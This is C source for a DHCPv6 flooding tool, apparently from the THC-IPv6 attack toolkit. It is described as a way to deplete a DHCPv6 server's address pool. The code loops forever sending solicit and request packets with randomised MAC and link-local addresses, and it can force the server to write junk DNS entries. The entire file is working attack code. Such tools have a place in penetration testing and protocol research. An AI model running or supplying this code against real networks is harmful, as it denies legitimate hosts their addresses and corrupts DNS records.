#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/select.h>
#include "thc-ipv6.h"

char *interface = NULL, *dns_name = NULL, elapsed[6] = {0, 8, 0, 2, 0, 0};
int   counter = 0, do_dns = 0;

// start0: 1-3 rand, 18-21 rand, 22-27 mac, 32-35 rand
char solicit[] = {0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00,
                  0x00, 0x00, 0x01, 0x00, 0x0e, 0x00, 0x01, 0x00, 0x01,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x03, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
char dnsupdate1[] = {0, 39, 0, 8, 1, 6, 122, 97, 97, 97, 97, 97};
char dnsupdate2[] = {0, 6, 0, 2, 0, 39};

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-n|-N] [-1] [-d domain-name] interface [dhcpserver]\n\n",
         prg);
  printf(
      "DHCP client flooder. Use to deplete the IP address pool a DHCP6 server "
      "is\n");
  printf(
      "offering. Note: if the pool is very large, this is rather senseless. "
      ":-)\n\n");
  printf(
      "By default the link-local IP MAC address is random, however this won't "
      "work\n");
  printf(
      "in some circumstances. -n will use the real MAC, -N the real MAC and\n");
  printf(
      "link-local address. -1 will only solicate an address but not request "
      "it.\n");
  printf("If -N is not used, you should run parasite6 in parallel.\n");
  printf("Use -d to force DNS updates, you must specify a domain name.\n");
  exit(-1);
}

void check_packets(u_char *foo, const struct pcap_pkthdr *header,
                   const unsigned char *data) {
  int            len = header->caplen, pkt_len = 0, mlen = 10, olen;
  unsigned char *ptr = (unsigned char *)data, *pkt = NULL;
  char *         smac, mac[6] = {0, 0x0d, 0, 0x0d, 0x0d, 0x0e};
  char           mybuf[1024] = {0x03, 0, 0, 0, 0, 8, 0, 2, 0, 0};

  if (do_hdr_size) {
    data += do_hdr_size;
    len -= do_hdr_size;
    if ((data[0] & 240) != 0x60) return;
  } else {
    data += 14;
    len -= 14;
  }

  if (len < 126 || data[6] != NXT_UDP || data[48] != 2) return;

  data += 48;
  len -= 48;

  memcpy(mybuf + 1, data + 1, 3);
  data += 4;
  len -= 4;
  while (len >= 4) {
    if ((olen = data[2] * 256 + data[3]) > len - 4 || olen < 0) {
      printf("Information: evil packet received\n");
      olen = 0;
      len = -1;
    } else {
      if (data[1] > 1 && data[1] <= 3) {
        memcpy(mybuf + mlen, data, olen + 4);
        mlen += olen + 4;
      } else if (data[1] == 1) {
        memcpy(mybuf + mlen, data, olen + 4);
        mlen += olen + 4;
        // smac auf client mac in paket setzen
        if (olen == 14)
          smac = (char *)(data + 12);
        else
          smac = mac;
      } else if (data[1] == 39 && do_dns) {
        memcpy(mybuf + mlen, data, olen + 4);
        mybuf[mlen + 4] = 1;  // force server to write dns entry
        mlen += olen + 4;
      }
      data += olen + 4;
      len -= olen + 4;
      if (len < 0) {
        printf("Information: evil packet received\n");
        len = -1;
      }
    }
  }

  if (len >= 0) {
    counter++;
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len,
                                        ptr + 38, ptr + 22, 1, 0, 0, 0, 0)) ==
        NULL)
      return;
    if (thc_add_udp(pkt, &pkt_len, 546, 547, 0, mybuf, mlen) < 0) return;
    if (thc_generate_and_send_pkt(interface, smac, ptr + 6, pkt, &pkt_len) < 0)
      return;
    pkt = thc_destroy_packet(pkt);
    if (counter % 1000 == 0) printf("!");
  }
}

int main(int argc, char *argv[]) {
  char                   mac[6] = {0, 0x0c, 0, 0, 0, 0}, *pkt = NULL;
  char                   wdatabuf[1024];
  unsigned char *        mac6 = mac, *src, *dst;
  int                    i, s, len, pkt_len = 0, dlen = 0;
  unsigned long long int count = 0;
  pcap_t *               p = NULL;
  int                    do_all = 1, use_real_mac = 0, use_real_link = 0;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL)
    printf("WARNING: %s is not working with injection!\n", argv[0]);

  while ((i = getopt(argc, argv, "d:nNr1")) >= 0) {
    switch (i) {
      case 'N':
        use_real_link = 1;  // no break
      case 'n':
        use_real_mac = 1;
        break;
      case '1':
        do_all = 0;
        break;
      case 'd':
        do_dns = 1;
        dns_name = optarg;
        break;
      case 'r':
        i = 0;
        break;  // just to ignore -r
      default:
        fprintf(stderr, "Error: unknown option -%c\n", i);
        exit(-1);
    }
  }

  memset(mac, 0, sizeof(mac));
  interface = argv[optind];
  if (use_real_link)
    src = thc_get_own_ipv6(interface, NULL, PREFER_LINK);
  else
    src = thc_resolve6("fe80::");
  if (use_real_mac) mac6 = thc_get_own_mac(interface);
  if (argc - optind <= 1)
    dst = thc_resolve6("ff02::1:2");
  else
    dst = thc_resolve6(argv[optind + 1]);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  if (src == NULL || mac6 == NULL) {
    fprintf(stderr, "Error: invalid interface %s or bad mac/IP defined\n",
            interface);
    exit(-1);
  }

  // only to prevent our system to send icmp port unreachable messages
  if ((s = thc_bind_udp_port(546)) < 0)
    fprintf(stderr, "Warning: could not bind to 546/udp\n");
  if ((p = thc_pcap_init_promisc(interface, "ip6 and udp and dst port 546")) ==
      NULL) {
    fprintf(stderr, "Error: can not open interface %s in promisc mode\n",
            interface);
    exit(-1);
  }
  len = sizeof(solicit);
  memcpy(wdatabuf, solicit, len);
  if (do_dns) {
    memcpy(wdatabuf + len, dnsupdate1, sizeof(dnsupdate1));
    dlen = len + 8;
    len += sizeof(dnsupdate1);
    if (dns_name != NULL && strlen(dns_name) < 240) {
      if (dns_name[0] != '.') {
        wdatabuf[len] = '.';
        wdatabuf[dlen - 5]++;
        wdatabuf[dlen - 3]++;
        len++;
      }
      memcpy(wdatabuf + len, dns_name, strlen(dns_name) + 1);
      wdatabuf[dlen - 5] += strlen(dns_name) + 1;
      wdatabuf[dlen - 3] += strlen(dns_name) + 1;
      len += strlen(dns_name) + 1;
    }
    memcpy(wdatabuf + len, dnsupdate2, sizeof(dnsupdate2));
    len += sizeof(dnsupdate2);
  }

  printf(
      "Starting to flood dhcp6 servers locally on %s (Press Control-C to end) "
      "...\n\n",
      interface);
  while (1) {
    count++;
    if (!use_real_link) memcpy(src + 8, (char *)&count, 8);
    // start0: 1-3 rand, 18-21 rand, 22-27 mac, 32-35 rand
    for (i = 0; i < 3; i++) {
      wdatabuf[i + 32] = rand() % 256;
      wdatabuf[i + 18] = rand() % 256;
      mac[i + 2] = rand() % 256;
      if (do_dns) wdatabuf[i + dlen] = 'a' + rand() % 26;
    }
    if (!use_real_mac) memcpy(wdatabuf + 22, mac, 6);
    memcpy(wdatabuf + 1, (char *)&count + _TAKE3, 3);

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src,
                                        dst, 1, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_udp(pkt, &pkt_len, 546, 547, 0, wdatabuf, len) < 0) return -1;
    // we have to tone it down, otherwise we will not get advertisements
    if (thc_generate_and_send_pkt(interface, mac6, NULL, pkt, &pkt_len) < 0)
      printf("!");
    pkt = thc_destroy_packet(pkt);
    if (do_all) {
      usleep(75);
      while (thc_pcap_check(p, (char *)check_packets, NULL) > 0)
        ;
    }
    if (count % 1000 == 0) printf(".");
  }

  return 0;  // never reached
}
